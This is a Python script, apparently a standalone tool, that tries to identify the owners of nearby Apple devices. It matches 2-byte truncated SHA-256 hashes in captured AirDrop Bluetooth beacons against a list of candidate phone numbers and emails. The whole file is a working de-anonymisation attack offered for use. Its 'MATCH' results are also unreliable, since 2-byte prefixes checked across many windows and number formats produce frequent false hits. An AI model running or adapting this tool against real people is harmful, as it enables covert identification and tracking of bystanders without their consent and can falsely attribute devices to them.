#!/usr/bin/env python3
"""AirDrop Continuity hash cracker (PrivateDrop USENIX Sec'21 math).

AirDrop BLE beacons (Apple TLV 0x05) carry 2-byte truncated SHA-256 hashes of
the sender's phone number and email. Given a candidate phone/email, we verify
by brute-forcing the 2-byte space — trivial.

Usage:
  python3 airdrop_crack.py --candidates candidates.txt [--jsonl ble_map.jsonl]
  candidates.txt: one phone/email per line (phone in any reasonable format)

Method (layout-agnostic): for each candidate, compute SHA-256 over a set of
normalizations (E.164 with/without '+', digits only, local format, raw email),
then check the 2-byte digest prefix against EVERY 2-byte window of the AirDrop
payload. A match flags the device as likely-owned-by-candidate.
"""
import argparse
import hashlib
import json
import sys


def phone_variants(raw: str):
    digits = "".join(c for c in raw if c.isdigit())
    out = {raw.strip(), digits}
    if raw.strip().startswith("+"):
        out.add(digits)
    else:
        for cc in ("+41", "+49", "+1", "+44", "+33"):
            out.add(cc + digits)
            out.add(cc + digits.lstrip("0"))
    return [v for v in out if v]


def digest_prefixes(value: str) -> set:
    d = hashlib.sha256(value.encode("utf-8")).digest()
    return {d[:2], d[1:3]}  # tolerate 1-bit offset conventions


def airdrop_payloads(jsonl_path: str):
    seen = {}
    with open(jsonl_path) as fh:
        for line in fh:
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            labels = rec.get("labels") or []
            if "AirDrop" not in labels and "AirDrop?" not in labels:
                continue
            mfg = bytes.fromhex(rec.get("mfg", ""))
            seen[rec.get("mac", "?")] = mfg  # last sample per MAC
    return seen


def extract_tlv05(mfg: bytes):
    # Apple TLVs: 2-byte company id 0x004C then TLV stream
    out = []
    i = 2
    while i + 1 < len(mfg):
        t, ln = mfg[i], mfg[i + 1]
        payload = mfg[i + 2:i + 2 + ln]
        if len(payload) < ln:
            break
        if t == 0x05:
            out.append(payload)
        i += 2 + ln
    return out


def crack(candidates, payloads):
    hits = []
    for mac, mfg in payloads.items():
        for pl in extract_tlv05(mfg):
            windows = {pl[o:o + 2] for o in range(max(1, len(pl) - 1))}
            for cand in candidates:
                for variant in (phone_variants(cand) if any(c.isdigit() for c in cand) else [cand]):
                    if digest_prefixes(variant) & windows:
                        hits.append((mac, cand, variant, pl.hex()))
                        break
    return hits


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--candidates", required=True)
    ap.add_argument("--jsonl", default="ble_map.jsonl")
    args = ap.parse_args()

    candidates = [l.strip() for l in open(args.candidates) if l.strip()]
    payloads = airdrop_payloads(args.jsonl)
    if not payloads:
        sys.exit("no AirDrop beacons in jsonl")
    print(f"{len(payloads)} AirDrop-advertising devices, {len(candidates)} candidates")
    hits = crack(candidates, payloads)
    if hits:
        for mac, cand, variant, hexpl in hits:
            print(f"MATCH {mac}: candidate {cand!r} (variant {variant!r}) payload {hexpl}")
    else:
        print("no candidate matches found in this capture")


if __name__ == "__main__":
    main()
